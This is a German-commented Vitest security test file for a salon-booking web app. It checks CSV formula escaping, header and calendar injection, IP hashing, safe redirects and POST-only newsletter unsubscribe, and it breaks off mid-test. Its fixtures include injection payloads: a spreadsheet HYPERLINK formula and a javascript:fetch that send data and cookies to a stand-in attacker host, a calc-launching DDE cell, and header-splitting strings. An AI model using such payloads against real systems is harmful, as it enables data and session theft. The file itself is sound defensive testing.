// @vitest-environment node
/**
 * Track 19: was ChairMatch aus dem Haus gibt.
 *
 * Geprueft werden die Nebenstrecken, an denen Daten die Anwendung verlassen
 * oder ungefragt liegen bleiben: CSV-Exporte, Datei-Downloads, die einzige
 * offene Weiterleitung, die Abmeldung aus dem Newsletter und die Protokolle,
 * in denen bis hierher rohe IP-Adressen standen.
 *
 * (1) CSV-Formeleinschleusung, (2) CR zerlegt CSV-Zeilen,
 * (3) Content-Disposition-Injection, (4) ICS-Escape,
 * (5) rohe PostgREST-Meldung in /api/analytics/vitals,
 * (6) rohe IPs in affiliate_clicks und error_logs,
 * (7) Abmeldung per GET, (8) Ticket-Status still verworfen,
 * (9) fehlende UUID-Pruefung, (10) ungepruefte URL-Felder,
 * (11) ungepruefte Weiterleitungsziele.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { NextRequest } from 'next/server'
import {
  createDb,
  sessionFor,
  ctx,
  IDS,
  type TestSession,
} from './e2e/_harness/fixtures'
import type { FakeSupabase } from './e2e/_harness/fake-supabase'

const state = vi.hoisted(() => {
  process.env.AUTH_SECRET ??= 'test-secret-nur-fuer-vitest'
  process.env.NEXT_PUBLIC_SUPABASE_URL ??= 'https://pwdbjqfpgumyfktbfswg.supabase.co'
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ??= 'anon-test-key'
  return {
    db: undefined as unknown as import('./e2e/_harness/fake-supabase').FakeSupabase,
    session: null as TestSession | null,
  }
})

vi.mock('@/lib/supabase-server', () => ({
  getSupabaseAdmin: () => state.db,
}))
vi.mock('@/modules/auth/session', () => ({
  getServerSession: async () => state.session,
  requireRole: async () => state.session,
}))
vi.mock('@/lib/error-tracking', () => ({
  logApiError: vi.fn(async () => undefined),
  logError: vi.fn(async () => undefined),
  isSentryConfigured: () => false,
}))

// ── Imports nach den Mocks ──────────────────────────────────────
import { __resetRateLimits } from '@/lib/rate-limit'
import { csvCell, csvRow, toCsv } from '@/lib/csv'
import { sanitizeFilename, attachmentDisposition } from '@/lib/content-disposition'
import { isSafeHttpUrl } from '@/lib/safe-url'
import { isUuid } from '@/lib/uuid'
import { generateICS } from '@/lib/calendar'
import { hashIp } from '@/lib/ip-hash'
import {
  buildUnsubscribeUrl,
  buildOneClickUnsubscribeUrl,
} from '@/lib/newsletter-template'

import { GET as adminExport } from '@/app/api/admin/export/route'
import { GET as providerExport } from '@/app/api/provider/dashboard/export/route'
import { GET as calendarGet } from '@/app/api/calendar/route'
import { POST as vitalsPost } from '@/app/api/analytics/vitals/route'
import { GET as affiliateTrack } from '@/app/api/affiliate/track/[productId]/route'
import {
  POST as unsubscribePost,
  GET as unsubscribeGet,
} from '@/app/api/newsletter/unsubscribe/route'
import {
  GET as complianceGet,
  POST as compliancePost,
} from '@/app/api/compliance/route'
import { GET as complianceCheck } from '@/app/api/compliance/check/route'
import {
  PUT as compliancePut,
  DELETE as complianceDelete,
} from '@/app/api/compliance/[id]/route'
import { POST as ownerDocuments } from '@/app/api/owner/documents/route'
import { POST as authoritiesPack } from '@/app/api/owner/authorities-pack/route'
import { GET as packDownload } from '@/app/api/owner/authorities-pack/[id]/download/route'
import { PATCH as adminDocumentPatch } from '@/app/api/admin/documents/[id]/route'
import { PATCH as adminTicketPatch } from '@/app/api/admin/tickets/[id]/route'
import { GET as conversationGet } from '@/app/api/messages/[conversationId]/route'
import { POST as messagesPost } from '@/app/api/messages/route'

const BASE = 'https://www.chairmatch.de'

function db(): FakeSupabase {
  return state.db
}

function req(url: string, init?: RequestInit): NextRequest {
  return new NextRequest(url, init as ConstructorParameters<typeof NextRequest>[1])
}

function jsonReq(url: string, method: string, body?: unknown): NextRequest {
  return req(url, {
    method,
    headers: { 'content-type': 'application/json' },
    body: body === undefined ? undefined : JSON.stringify(body),
  })
}

function formReq(url: string, fields: Record<string, string>, accept?: string): NextRequest {
  return req(url, {
    method: 'POST',
    headers: {
      'content-type': 'application/x-www-form-urlencoded',
      ...(accept ? { accept } : {}),
    },
    body: new URLSearchParams(fields).toString(),
  })
}

/** Ein Zellwert aus einer CSV-Zeile — bewusst simpel, reicht fuer die Assertions. */
function cells(line: string, delimiter = ','): string[] {
  const out: string[] = []
  let cur = ''
  let quoted = false
  for (let i = 0; i < line.length; i++) {
    const c = line[i]
    if (quoted) {
      if (c === '"' && line[i + 1] === '"') { cur += '"'; i++ }
      else if (c === '"') quoted = false
      else cur += c
    } else if (c === '"') quoted = true
    else if (c === delimiter) { out.push(cur); cur = '' }
    else cur += c
  }
  out.push(cur)
  return out
}

const ANGRIFFSNAME = '=HYPERLINK("https://angreifer.example/?d="&A1,"Rechnung")'

beforeEach(() => {
  state.db = createDb()
  state.session = null
  __resetRateLimits()
})

afterEach(() => {
  vi.clearAllMocks()
})

// ────────────────────────────────────────────────────────────────
// 1. CSV: die Tabellenkalkulation liest Text, kein Programm
// ────────────────────────────────────────────────────────────────
describe('1. CSV-Formeleinschleusung', () => {
  it('entschaerft eine Zelle, die mit = beginnt', () => {
    expect(csvCell('=1+1')).toBe("'=1+1")
  })

  it.each(['+', '-', '@', '\t'])('entschaerft auch das Praefix %j', (lead) => {
    const out = csvCell(`${lead}cmd|'/c calc'!A0`)
    expect(out.startsWith("'")).toBe(true)
  })

  it('laesst eine gewoehnliche Zeichenkette unveraendert', () => {
    expect(csvCell('Lena Kundin')).toBe('Lena Kundin')
  })

  it('laesst Zahlen in Ruhe — ein negativer Betrag wird nicht zu Text', () => {
    // Im Semikolon-Export (Steuerberater-Format) steht der Betrag blank da.
    expect(csvCell('-12,50', ';')).toBe('-12,50')
    expect(csvCell('-5')).toBe('-5')
    expect(csvCell('0.00')).toBe('0.00')
    // Im Komma-Export wird nur gequotet, nicht als Formel entschaerft.
    expect(csvCell('-12,50')).toBe('"-12,50"')
  })

  it('quotet das Trennzeichen und verdoppelt Anfuehrungszeichen', () => {
    expect(csvCell('a,b')).toBe('"a,b"')
    expect(csvCell('sagt "hallo"')).toBe('"sagt ""hallo"""')
    expect(csvCell('a;b', ';')).toBe('"a;b"')
  })

  it('quotet auch einen einzelnen Wagenruecklauf — nicht nur \\n', () => {
    // Der alte Escape sah nur `\n`. Ein CR blieb ungequotet und zerlegte die
    // Zeile; ab dort war die ganze Datei um eine Spalte verschoben.
    const out = csvCell('Zeile1\rZeile2')
    expect(out.startsWith('"')).toBe(true)
    expect(out.endsWith('"')).toBe(true)
  })

  it('wirft Steuerzeichen weg, die in keiner Zelle stehen sollten', () => {
    expect(csvCell('a\u0001b\u0007c')).toBe('abc')
  })

  it('csvRow und toCsv verbinden mit dem gewaehlten Trenner und CRLF', () => {
    expect(csvRow(['a', 'b'], ';')).toBe('a;b')
    const csv = toCsv(['x', 'y'], [['1', '2']])
    expect(csv).toBe('x,y\r\n1,2')
  })

  it('setzt auf Wunsch ein BOM voran', () => {
    expect(toCsv(['x'], [], { bom: true }).charCodeAt(0)).toBe(0xfeff)
  })
})

describe('2. /api/admin/export: der Benutzer-Export ist keine Formel mehr', () => {
  beforeEach(() => {
    state.session = sessionFor('admin')
    db().row('profiles', IDS.customer)!.full_name = ANGRIFFSNAME
    db().row('profiles', IDS.customer)!.created_at = '2026-08-01T10:00:00.000Z'
  })

  it('setzt vor einen Namen, der mit = beginnt, ein Apostroph', async () => {
    const res = await adminExport(req(`${BASE}/api/admin/export?type=users`))
    expect(res.status).toBe(200)
    const csv = await res.text()

    const zeile = csv.split('\r\n').find((l) => l.includes('HYPERLINK'))
    expect(zeile).toBeDefined()
    const nameZelle = cells(zeile as string)[2]
    expect(nameZelle.startsWith("'=")).toBe(true)
    // Und keine Zelle der Datei faengt roh mit einem Formelzeichen an.
    for (const line of csv.split('\r\n')) {
      for (const cell of cells(line)) {
        expect(/^[=+@]/.test(cell)).toBe(false)
      }
    }
  })

  it('ein Name mit Wagenruecklauf erzeugt keine zusaetzliche Zeile', async () => {
    db().row('profiles', IDS.customer)!.full_name = 'Lena\rBoese;admin'
    const res = await adminExport(req(`${BASE}/api/admin/export?type=users`))
    const csv = await res.text()
    // Kopfzeile + so viele Zeilen wie Profile — nicht mehr.
    const profile = db().rows('profiles').length
    expect(csv.split('\r\n')).toHaveLength(profile + 1)
  })

  it('liefert einen bereinigten Dateinamen mit no-store', async () => {
    const res = await adminExport(req(`${BASE}/api/admin/export?type=users`))
    const cd = res.headers.get('content-disposition') || ''
    expect(cd.startsWith('attachment; filename="chairmatch-benutzer-')).toBe(true)
    expect(res.headers.get('cache-control')).toBe('no-store')
  })

  it('bleibt fuer Nicht-Admins verschlossen', async () => {
    state.session = sessionFor('customer')
    const res = await adminExport(req(`${BASE}/api/admin/export?type=users`))
    expect(res.status).toBe(403)
  })

  /*
   * Track E — ein Lesefehler ist kein leerer Export.
   *
   * Jede der vier Abfragen in dieser Route hat nur `data` destrukturiert.
   * Faellt eine aus, ist `data` gleich `null`, `(data ?? [])` gleich `[]`, und
   * die Route liefert Status 200 mit einer gueltigen CSV-Datei, die AUSSER
   * DER KOPFZEILE NICHTS enthaelt — unter dem Namen
   * `chairmatch-benutzer-<datum>.csv`.
   *
   * Dieselbe Klasse wie der Provisionsbefund aus Track 25, aber teurer: die
   * Datei verlaesst den Bildschirm. In der Buchhaltung, in einer
   * DSGVO-Auskunft oder beim Steuerberater ist ihr nicht mehr anzusehen, dass
   * sie nie Daten enthielt.
   */
  it('liefert bei einem Lesefehler 503 statt einer leeren Datei', async () => {
    db().failOn('profiles', 'select', {
      code: '08006', message: 'connection failure', details: null, hint: null,
    }, false)

    const res = await adminExport(req(`${BASE}/api/admin/export?type=users`))

    expect(res.status).toBe(503)
    // Vor allem: KEINE Datei. Eine leere CSV im Download-Ordner ist
    // schlimmer als eine Fehlermeldung.
    expect(res.headers.get('content-disposition')).toBeNull()
    const body = await res.json()
    expect(body.error).toMatch(/nicht vollständig gelesen/i)
  })

  it('meldet den Lesefehler auch fuer die anderen Exporttypen', async () => {
    db().failOn('bookings', 'select', {
      code: '08006', message: 'connection failure', details: null, hint: null,
    }, false)

    for (const typ of ['bookings', 'revenue']) {
      const res = await adminExport(req(`${BASE}/api/admin/export?type=${typ}`))
      expect(res.status).toBe(503)
    }
  })
})

describe('3. /api/provider/dashboard/export: Semikolon-CSV ohne Formeln', () => {
  beforeEach(() => {
    state.session = sessionFor('owner')
    db().row('platform_transactions', IDS.transaction)!.created_at = '2026-08-01T10:00:00.000Z'
  })

  it('trennt weiterhin mit Semikolon und traegt das BOM', async () => {
    const res = await providerExport(req(`${BASE}/api/provider/dashboard/export`))
    expect(res.status).toBe(200)
    // `Response.text()` entfernt ein fuehrendes BOM beim Dekodieren — der
    // Nachweis muss deshalb ueber die Bytes laufen.
    const bytes = new Uint8Array(await res.clone().arrayBuffer())
    expect([bytes[0], bytes[1], bytes[2]]).toEqual([0xef, 0xbb, 0xbf])
    const csv = await res.text()
    expect(csv.split('\r\n')[0]).toContain('Datum;Transaktions-ID')
    expect(csv).toContain('350,00')
  })

  it('entschaerft einen Typ, der als Formel gemeint ist', async () => {
    db().row('platform_transactions', IDS.transaction)!.type = '=cmd|calc'
    const res = await providerExport(req(`${BASE}/api/provider/dashboard/export`))
    const csv = await res.text()
    expect(csv).toContain("'=cmd|calc")
    expect(csv).not.toContain(';=cmd|calc')
  })

  it('exportiert nur die eigenen Transaktionen', async () => {
    state.session = sessionFor('customer')
    const res = await providerExport(req(`${BASE}/api/provider/dashboard/export`))
    const csv = await res.text()
    expect(csv).not.toContain('pi_test_bestand')
  })
})

// ────────────────────────────────────────────────────────────────
// 4. Content-Disposition
// ────────────────────────────────────────────────────────────────
describe('4. Content-Disposition: der Anbieter bestimmt keinen Header', () => {
  it('wirft Anfuehrungszeichen, Semikolon und Pfadtrenner weg', () => {
    const name = sanitizeFilename('schnitt"; filename="rechnung.html')
    expect(name).not.toContain('"')
    expect(name).not.toContain(';')
    expect(sanitizeFilename('../../etc/passwd')).not.toContain('/')
  })

  it('wirft Steuerzeichen weg — ein Zeilenumbruch bricht sonst den Header', () => {
    const value = attachmentDisposition('datei\r\nX-Evil: 1.txt')
    expect(value).not.toMatch(/[\r\n]/)
    // Node lehnt ungueltige Header-Werte ab; der Wert muss also sauber sein.
    expect(() => new Response('x', { headers: { 'content-disposition': value } })).not.toThrow()
  })

  it('faellt auf einen Ersatznamen zurueck, wenn nichts uebrig bleibt', () => {
    expect(sanitizeFilename('"""', 'download')).toBe('download')
    expect(attachmentDisposition('///', 'ersatz')).toBe('attachment; filename="ersatz"')
  })

  it('haengt fuer Umlaute zusaetzlich filename* an', () => {
    const value = attachmentDisposition('Behördenpaket.txt')
    expect(value).toContain('filename="Beh_rdenpaket.txt"')
    expect(value).toContain("filename*=UTF-8''")
  })

  it('deckelt die Laenge', () => {
    expect(sanitizeFilename('a'.repeat(500)).length).toBeLessThanOrEqual(100)
  })
})

// ────────────────────────────────────────────────────────────────
// 5. ICS
// ────────────────────────────────────────────────────────────────
describe('5. generateICS: keine fremden Zeilen im Kalender', () => {
  const basis = {
    id: IDS.bookingConfirmed,
    booking_date: '2026-09-15',
    start_time: '10:00',
    end_time: '11:00',
    salon: { name: 'Salon Test', street: 'Hauptstr', house_number: '1', postal_code: '10115', city: 'Berlin' },
    service: { name: 'Schnitt' },
  }

  it('entfernt den Wagenruecklauf aus einer Notiz', () => {
    const ics = generateICS({ ...basis, notes: 'harmlos\r\nATTENDEE:mailto:opfer@example.de' })
    const nachKopf = ics.split('\r\n').filter((l) => l.startsWith('ATTENDEE'))
    expect(nachKopf).toHaveLength(0)
    expect(ics.split('DESCRIPTION:')[1].split('\r\n')[0]).toContain('ATTENDEE')
  })

  it('haelt jede Zeile der Datei bei einer bekannten Eigenschaft', () => {
    const ics = generateICS({ ...basis, notes: 'a\rb\nc' })
    for (const line of ics.split('\r\n')) {
      expect(line).toMatch(/^[A-Z-]+[;:]/)
    }
  })

  it('escaped Semikolon und Komma nach RFC 5545', () => {
    const ics = generateICS({ ...basis, notes: 'eins, zwei; drei' })
    expect(ics).toContain('eins\\, zwei\\; drei')
  })

  it('verbindet die Beschreibungsteile mit einem echten iCal-Umbruch', () => {
    // Vorher lief der Escape ueber die zusammengesetzte Zeichenkette und
    // verdoppelte den Backslash des Trenners: im Kalender stand buchstaeblich
    // "Service: X\\nSalon: Y".
    const ics = generateICS(basis)
    const description = ics.split('DESCRIPTION:')[1].split('\r\n')[0]
    expect(description).toContain('Service: Schnitt\\nSalon: Salon Test')
    expect(description).not.toContain('\\\\n')
  })
})

describe('6. /api/calendar: Download ohne Kopfzeilen-Trick', () => {
  beforeEach(() => {
    state.session = sessionFor('customer')
    db().row('bookings', IDS.bookingConfirmed)!.customer_id = IDS.customer
  })

  it('lehnt eine Nicht-UUID mit 400 ab statt mit "nicht gefunden"', async () => {
    const res = await calendarGet(req(`${BASE}/api/calendar?bookingId=nicht-uuid`))
    expect(res.status).toBe(400)
    expect((await res.json()).error).toMatch(/Ungültige bookingId/)
  })

  it('baut aus einem boesartigen Leistungsnamen keinen zweiten filename-Parameter', async () => {
    db().row('services', IDS.service)!.name = 'Schnitt"; filename="rechnung.html'
    const res = await calendarGet(
      req(`${BASE}/api/calendar?bookingId=${IDS.bookingConfirmed}`),
    )
    expect(res.status).toBe(200)
    const cd = res.headers.get('content-disposition') || ''
    // Genau ein Parameter, und sein Wert steht vollstaendig in einem Paar
    // Anfuehrungszeichen: aus dem Wert heraus laesst sich nichts anhaengen.
    expect(cd).toMatch(/^attachment; filename="[^"]*"$/)
    expect(cd).toContain('rechnung.html')
  })

  it('antwortet nicht mit 500, wenn der Leistungsname einen Zeilenumbruch hat', async () => {
    db().row('services', IDS.service)!.name = 'Schnitt\r\nX-Evil: 1'
    const res = await calendarGet(
      req(`${BASE}/api/calendar?bookingId=${IDS.bookingConfirmed}`),
    )
    expect(res.status).toBe(200)
    expect(res.headers.get('content-disposition')).not.toMatch(/[\r\n]/)
  })

  it('bleibt fuer Fremde verschlossen', async () => {
    state.session = sessionFor('otherCustomer')
    const res = await calendarGet(
      req(`${BASE}/api/calendar?bookingId=${IDS.bookingConfirmed}`),
    )
    expect(res.status).toBe(403)
  })
})

// ────────────────────────────────────────────────────────────────
// 7. Rohe DB-Meldung in der oeffentlichen Telemetrie
// ────────────────────────────────────────────────────────────────
describe('7. /api/analytics/vitals nennt keine Tabellen mehr', () => {
  it('antwortet generisch, wenn der Insert scheitert', async () => {
    db().failOn('analytics_events', 'insert', {
      code: '42501',
      message: 'permission denied for table analytics_events',
      details: null,
      hint: null,
    })
    const res = await vitalsPost(
      jsonReq(`${BASE}/api/analytics/vitals`, 'POST', {
        name: 'LCP',
        value: 1200,
        session_id: 'sess-1',
      }),
    )
    expect(res.status).toBe(500)
    const body = await res.json()
    expect(body.error).toBe('Interner Fehler')
    expect(JSON.stringify(body)).not.toMatch(/42501|permission denied|analytics_events/)
  })

  it('nimmt eine gueltige Messung weiterhin an', async () => {
    const res = await vitalsPost(
      jsonReq(`${BASE}/api/analytics/vitals`, 'POST', {
        name: 'CLS',
        value: 0.02,
        session_id: 'sess-2',
      }),
    )
    expect(res.status).toBe(200)
    expect(db().insertsInto('analytics_events')).toHaveLength(1)
  })
})

// ────────────────────────────────────────────────────────────────
// 8. Rohe IPs in den Protokollen
// ────────────────────────────────────────────────────────────────
describe('8. Klick- und Fehlerprotokoll speichern keine Klartext-IP', () => {
  const KLICK_IP = '203.0.113.42'

  beforeEach(() => {
    db().rows('affiliate_products').push({
      id: IDS.equipment,
      product_url: 'https://partner.example/produkt/1',
      is_active: true,
    })
  })

  it('affiliate_clicks bekommt den Kennwert, nicht die Adresse', async () => {
    const res = await affiliateTrack(
      req(`${BASE}/api/affiliate/track/${IDS.equipment}?source=feed`, {
        headers: { 'x-forwarded-for': `${KLICK_IP}, 70.41.3.18` },
      }),
      ctx({ productId: IDS.equipment }),
    )
    expect(res.status).toBe(302)

    const klicks = db().insertsInto('affiliate_clicks')
    expect(klicks).toHaveLength(1)
    expect(klicks[0].ip).toBe(hashIp(KLICK_IP))
    expect(JSON.stringify(klicks[0])).not.toContain(KLICK_IP)
  })

  it('derselbe Besucher bekommt denselben Kennwert — die Statistik bleibt brauchbar', () => {
    expect(hashIp(KLICK_IP)).toBe(hashIp(KLICK_IP))
    expect(hashIp(KLICK_IP)).not.toBe(hashIp('198.51.100.7'))
  })

  it('logError schreibt den Kennwert in error_logs', async () => {
    const { logError } = await vi.importActual<typeof import('@/lib/error-tracking')>(
      '@/lib/error-tracking',
    )
    await logError(new Error('kaputt'), { ip: KLICK_IP, severity: 'high' })
    const zeilen = db().insertsInto('error_logs')
    expect(zeilen).toHaveLength(1)
    expect(zeilen[0].ip).toBe(hashIp(KLICK_IP))
    expect(JSON.stringify(zeilen[0])).not.toContain(KLICK_IP)
  })
})

describe('9. Affiliate-Weiterleitung: nur http(s)', () => {
  it('leitet auf ein gueltiges Ziel weiter', async () => {
    db().rows('affiliate_products').push({
      id: IDS.equipment,
      product_url: 'https://partner.example/produkt/1',
      is_active: true,
    })
    const res = await affiliateTrack(
      req(`${BASE}/api/affiliate/track/${IDS.equipment}`),
      ctx({ productId: IDS.equipment }),
    )
    expect(res.status).toBe(302)
    expect(res.headers.get('location')).toBe('https://partner.example/produkt/1')
  })

  it('leitet NICHT auf ein javascript:-Ziel weiter', async () => {
    db().rows('affiliate_products').push({
      id: IDS.equipment,
      // Altbestand oder direkter DB-Zugriff — die Schreibroute prueft, diese
      // Route verlaesst sich nicht darauf.
      product_url: 'javascript:alert(document.cookie)',
      is_active: true,
    })
    const res = await affiliateTrack(
      req(`${BASE}/api/affiliate/track/${IDS.equipment}`),
      ctx({ productId: IDS.equipment }),
    )
    expect(res.status).toBe(404)
    expect(res.headers.get('location')).toBeNull()
  })

  it('weist eine Nicht-UUID als Produkt-ID ab', async () => {
    const res = await affiliateTrack(
      req(`${BASE}/api/affiliate/track/../../etc`),
      ctx({ productId: '../../etc' }),
    )
    expect(res.status).toBe(400)
  })

  it('isSafeHttpUrl kennt die Grenzen', () => {
    expect(isSafeHttpUrl('https://example.de/a')).toBe(true)
    expect(isSafeHttpUrl('http://example.de')).toBe(true)
    expect(isSafeHttpUrl('javascript:alert(1)')).toBe(false)
    expect(isSafeHttpUrl('data:text/html,<script>1</script>')).toBe(false)
    expect(isSafeHttpUrl('/relativ')).toBe(false)
    expect(isSafeHttpUrl('')).toBe(false)
    expect(isSafeHttpUrl(null)).toBe(false)
  })
})

// ────────────────────────────────────────────────────────────────
// 10. Newsletter-Abmeldung
// ────────────────────────────────────────────────────────────────
describe('10. Abmeldung aendert nur auf POST', () => {
  const TOKEN = 'unsub-token-123'

  beforeEach(() => {
    db().rows('newsletter_subscribers').push({
      id: '20202020-2020-4020-8020-202020202020',
      email: 'leserin@example.de',
      status: 'active',
      unsubscribe_token: TOKEN,
    })
  })

  const status = () => db().rows('newsletter_subscribers')[0].status

  it('ein GET auf den Endpunkt meldet niemanden ab — Linkscanner laufen ins Leere', async () => {
    const res = await unsubscribeGet(
      req(`${BASE}/api/newsletter/unsubscribe?token=${TOKEN}`),
    )
    expect(res.status).toBe(303)
    expect(status()).toBe('active')
  })

  it('ein POST meldet ab', async () => {
    const res = await unsubscribePost(
      formReq(`${BASE}/api/newsletter/unsubscribe`, { token: TOKEN, action: 'unsubscribe' }),
    )
    expect(res.status).toBe(200)
    expect(status()).toBe('unsubscribed')
    expect(db().rows('newsletter_subscribers')[0].unsubscribed_at).toBeTruthy()
  })

  it('nimmt den Token auch aus der Query — One-Click nach RFC 8058', async () => {
    const res = await unsubscribePost(
      req(`${BASE}/api/newsletter/unsubscribe?token=${TOKEN}`, {
        method: 'POST',
        headers: { 'content-type': 'application/x-www-form-urlencoded' },
        body: 'List-Unsubscribe=One-Click',
      }),
    )
    expect(res.status).toBe(200)
    expect(status()).toBe('unsubscribed')
  })

  it('meldet auf Wunsch wieder an', async () => {
    db().rows('newsletter_subscribers')[0].status = 'unsubscribed'
    const res = await unsubscribePost(
      formReq(`${BASE}/api/newsletter/unsubscribe`, { token: TOKEN, action: 'resubscribe' }),
    )
    expect(res.status).toBe(200)
    expect(status()).toBe('active')
  })

  it('leitet ein Browser-Formular auf die Ergebnisseite zurueck', async () => {
    const res = await unsubscribePost(
      formReq(
        `${BASE}/api/newsletter/unsubscribe`,
        { token: TOKEN, action: 'unsubscribe' },
        'text/html',
      ),
    )
    expect(res.status).toBe(303)
    expect(res.headers.get('location')).toContain('/unsubscribe?state=success')
    // Die Adresse darf nicht im Redirect stehen.
    expect(res.headers.get('location')).not.toContain('leserin@example.de')
  })

  it('unbekannter Token: 404 und niemand wird abgemeldet', async () => {
    const res = await unsubscribePost(
      formReq(`${BASE}/api/newsletter/unsubscribe`, { token: 'gibt-es-nicht' }),
    )
    expect(res.status).toBe(404)
    expect(status()).toBe('active')
  })

  it('ohne Token: 400', async () => {
    const res = await unsubscribePost(
      formReq(`${BASE}/api/newsletter/unsubscribe`, { action: 'unsubscribe' }),
    )
    expect(res.status).toBe(400)
    expect(status()).toBe('active')
  })

  it('ein Lesefehler wird nicht als "Link ungueltig" ausgegeben', async () => {
    db().failOn('newsletter_subscribers', 'select', {
      code: '42703',
      message: 'column newsletter_subscribers.unsubscribe_token does not exist',
      details: null,
      hint: null,
    })
    const res = await unsubscribePost(
      formReq(`${BASE}/api/newsletter/unsubscribe`, { token: TOKEN }),
    )
    expect(res.status).toBe(500)
    expect((await res.json()).state).toBe('error')
  })

  it('deckelt das Durchprobieren von Tokens', async () => {
    let letzte = 0
    for (let i = 0; i < 25; i++) {
      const res = await unsubscribePost(
        formReq(`${BASE}/api/newsletter/unsubscribe`, { token: `raten-${i}` }),
      )
      letzte = res.status
    }
    expect(letzte).toBe(429)
  })

  it('der List-Unsubscribe-Header zeigt auf den POST-Endpunkt, der Link auf die Seite', () => {
    expect(buildOneClickUnsubscribeUrl(TOKEN)).toContain('/api/newsletter/unsubscribe?token=')
    expect(buildUnsubscribeUrl(TOKEN)).toContain('/unsubscribe?token=')
    expect(buildUnsubscribeUrl(TOKEN)).not.toContain('/api/')
  })
})

// ────────────────────────────────────────────────────────────────
// 11. Ticket-Status
// ────────────────────────────────────────────────────────────────
describe('11. /api/admin/tickets/[id]: kein stilles ok', () => {
  const TICKET = '30303030-3030-4030-8030-303030303030'

  beforeEach(() => {
    state.session = sessionFor('admin')
    db().rows('submission_tickets').push({ id: TICKET, status: 'OPEN', admin_notes: null })
  })

  it('lehnt einen unbekannten Status ab, statt ok zu melden', async () => {
    const res = await adminTicketPatch(
      jsonReq(`${BASE}/api/admin/tickets/${TICKET}`, 'PATCH', { status: 'ERLEDIGT' }),
      ctx({ id: TICKET }),
    )
    expect(res.status).toBe(400)
    expect(db().row('submission_tickets', TICKET)!.status).toBe('OPEN')
  })

  it('lehnt eine Anfrage ohne Aenderung ab', async () => {
    const res = await adminTicketPatch(
      jsonReq(`${BASE}/api/admin/tickets/${TICKET}`, 'PATCH', {}),
      ctx({ id: TICKET }),
    )
    expect(res.status).toBe(400)
  })

  it('setzt einen erlaubten Status', async () => {
    const res = await adminTicketPatch(
      jsonReq(`${BASE}/api/admin/tickets/${TICKET}`, 'PATCH', { status: 'DONE' }),
      ctx({ id: TICKET }),
    )
    expect(res.status).toBe(200)
    expect(db().row('submission_tickets', TICKET)!.status).toBe('DONE')
  })

  it('weist eine Nicht-UUID ab', async () => {
    const res = await adminTicketPatch(
      jsonReq(`${BASE}/api/admin/tickets/kaputt`, 'PATCH', { status: 'DONE' }),
      ctx({ id: 'kaputt' }),
    )
    expect(res.status).toBe(400)
  })
})

// ────────────────────────────────────────────────────────────────
// 12. Compliance- und Dokumentstrecke
// ────────────────────────────────────────────────────────────────
describe('12. Compliance: gepruefte IDs und gepruefte URLs', () => {
  beforeEach(() => {
    state.session = sessionFor('owner')
    db().row('salons', IDS.salon)!.owner_id = IDS.owner
  })

  const gueltig = {
    salonId: IDS.salon,
    documentType: 'hygienezertifikat',
    fileUrl: 'https://storage.example/doc.pdf',
    fileName: 'hygiene.pdf',
  }

  it('nimmt ein vollstaendiges Dokument an', async () => {
    const res = await compliancePost(
      jsonReq(`${BASE}/api/compliance`, 'POST', gueltig),
    )
    expect(res.status).toBe(201)
    expect(db().insertsInto('compliance_documents')).toHaveLength(1)
  })

  it('lehnt eine javascript:-URL als Dateilink ab', async () => {
    const res = await compliancePost(
      jsonReq(`${BASE}/api/compliance`, 'POST', {
        ...gueltig,
        fileUrl: 'javascript:fetch("https://angreifer.example/?c="+document.cookie)',
      }),
    )
    expect(res.status).toBe(400)
    expect(db().insertsInto('compliance_documents')).toHaveLength(0)
  })

  it('lehnt ein unsinniges Ablaufdatum ab, statt in einen 500 zu laufen', async () => {
    const res = await compliancePost(
      jsonReq(`${BASE}/api/compliance`, 'POST', { ...gueltig, expiresAt: 'irgendwann' }),
    )
    expect(res.status).toBe(400)
  })

  it('deckelt den Dateinamen', async () => {
    const res = await compliancePost(
      jsonReq(`${BASE}/api/compliance`, 'POST', { ...gueltig, fileName: 'a'.repeat(300) }),
    )
    expect(res.status).toBe(400)
  })

  it('GET weist eine Nicht-UUID als salonId ab', async () => {
    const res = await complianceGet(req(`${BASE}/api/compliance?salonId=abc`))
    expect(res.status).toBe(400)
  })

  it('check weist eine Nicht-UUID als salonId ab', async () => {
    const res = await complianceCheck(req(`${BASE}/api/compliance/check?salonId=abc`))
    expect(res.status).toBe(400)
  })

  it('GET bleibt fuer einen fremden Salon verschlossen', async () => {
    state.session = sessionFor('otherCustomer')
    const res = await complianceGet(req(`${BASE}/api/compliance?salonId=${IDS.salon}`))
    expect(res.status).toBe(403)
  })

  it('PUT weist eine Nicht-UUID ab und laesst nur Admins durch', async () => {
    state.session = sessionFor('admin')
    const res = await compliancePut(
      jsonReq(`${BASE}/api/compliance/kaputt`, 'PUT', { status: 'approved' }),
      ctx({ id: 'kaputt' }),
    )
    expect(res.status).toBe(400)

    state.session = sessionFor('owner')
    const res2 = await compliancePut(
      jsonReq(`${BASE}/api/compliance/${IDS.unknown}`, 'PUT', { status: 'approved' }),
      ctx({ id: IDS.unknown }),
    )
    expect(res2.status).toBe(403)
  })

  it('PUT deckelt die Notiz des Pruefers', async () => {
    state.session = sessionFor('admin')
    const res = await compliancePut(
      jsonReq(`${BASE}/api/compliance/${IDS.unknown}`, 'PUT', {
        status: 'approved',
        notes: 'x'.repeat(3000),
      }),
      ctx({ id: IDS.unknown }),
    )
    expect(res.status).toBe(400)
  })

  it('DELETE weist eine Nicht-UUID ab', async () => {
    const res = await complianceDelete(
      jsonReq(`${BASE}/api/compliance/kaputt`, 'DELETE'),
      ctx({ id: 'kaputt' }),
    )
    expect(res.status).toBe(400)
  })
})

describe('13. Owner-Dokumente und Behoerdenpaket', () => {
  beforeEach(() => {
    state.session = sessionFor('owner')
    db().row('salons', IDS.salon)!.owner_id = IDS.owner
  })

  it('lehnt eine javascript:-URL als Dateilink ab', async () => {
    const res = await ownerDocuments(
      jsonReq(`${BASE}/api/owner/documents`, 'POST', {
        owner_type: 'location',
        owner_id: IDS.salon,
        doc_type: 'Hygiene-Plan',
        file_url: 'javascript:alert(1)',
      }),
    )
    expect(res.status).toBe(400)
    expect(db().insertsInto('documents')).toHaveLength(0)
  })

  it('nimmt einen http(s)-Link an', async () => {
    const res = await ownerDocuments(
      jsonReq(`${BASE}/api/owner/documents`, 'POST', {
        owner_type: 'location',
        owner_id: IDS.salon,
        doc_type: 'Hygiene-Plan',
        file_url: 'https://storage.example/plan.pdf',
      }),
    )
    expect(res.status).toBe(200)
    expect(db().insertsInto('documents')[0].url).toBe('https://storage.example/plan.pdf')
  })

  it('weist eine Nicht-UUID als owner_id ab', async () => {
    const res = await ownerDocuments(
